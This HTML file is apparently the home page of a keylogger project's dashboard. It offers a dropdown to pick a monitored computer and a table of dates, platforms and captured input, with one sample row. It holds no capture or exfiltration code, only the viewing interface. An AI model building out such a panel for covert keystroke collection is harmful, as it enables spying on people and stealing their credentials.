<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger home page</title>
    <link rel="stylesheet" href="home-page.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>keylogger system<span class="cursor">_</span></h2>
        </div>
        <div class="main">
            <div class="drop-down">
                <label for="computerDropdown">select computer:</label>
                <select id="computerDropdown" onchange="selectedComputer(event)">
                   <option value="">Loading...</option>
                </select>
             </div>
             <div class="table-data" style="display: none;">
                <table>
                    <thead>
                        <tr>
                            <th>Date</th>
                            <th>Platform</th>
                            <th>Input</th>
                        </tr>
                    </thead>
                    <tbody id="table-body">
                        <tr>
                            <td>2024-02-19</td>
                            <td>Windows</td>
                            <td>Sample Data</td>
                        </tr>
                    </tbody>
                </table>
             </div>

        </div>

    </div>
    <script src="home-page.js"></script>
</body>
</html>
